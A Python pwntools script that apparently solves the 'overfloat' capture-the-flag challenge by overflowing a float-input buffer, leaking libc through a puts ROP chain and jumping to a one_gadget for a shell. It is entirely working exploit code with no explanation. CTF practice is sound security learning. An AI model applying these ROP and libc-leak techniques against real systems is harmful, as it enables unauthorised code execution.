from pwn import *

r = process("./overfloat")
#nc challenges.fbctf.com 1341
#r = remote("challenges.fbctf.com",1341)
break_cmd = """
b *0x0000000000400986
"""
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-2.27.so",checksec=False)
#gdb.attach(r,break_cmd)
#gdb.attach(r)
def bitsToFloat(b):
    s = struct.pack('>L', b)
    m = struct.unpack('>f', s)[0]
    return str(m)

def junk():
    r.sendlineafter(": ",bitsToFloat(0x41414141))
    r.sendlineafter(": ",bitsToFloat(0x42424242))

def main():
    pop_rdi = 0x0000000000400a83
    puts_got = 0x000000602020
    puts_plt = 0x0000000000400690
    main = 0x0000000000400993
    for i in range(7):
        junk()


    r.sendlineafter(": ",bitsToFloat(pop_rdi))
    r.sendlineafter(": ",bitsToFloat(0))

    r.sendlineafter(": ",bitsToFloat(puts_got))
    r.sendlineafter(": ",bitsToFloat(0))

    r.sendlineafter(": ",bitsToFloat(puts_plt))
    r.sendlineafter(": ",bitsToFloat(0))

    r.sendlineafter(": ",bitsToFloat(main))
    r.sendlineafter(": ",bitsToFloat(0))

    r.sendlineafter(": ","done")
    r.recvuntil("BON VOYAGE!\n")
    libc_base = u64(r.recvline().strip().ljust(8,"\x00")) - libc.symbols['puts']
    one_gadget = libc_base + 0x4f2c5 #0x45216
    print(hex(libc_base))
    print(hex(one_gadget))

    for i in range(7):
        junk()

    part1 = one_gadget & 0xffffffff
    part2 = one_gadget >> 32

    log.info("part1 : " + hex(part1))
    log.info("part2 : " + hex(part2))

    r.sendlineafter(": ",bitsToFloat(part1))
    r.sendlineafter(": ",bitsToFloat(part2))

    r.sendlineafter(": ","done")

    r.interactive()


if __name__ == "__main__":
    main()
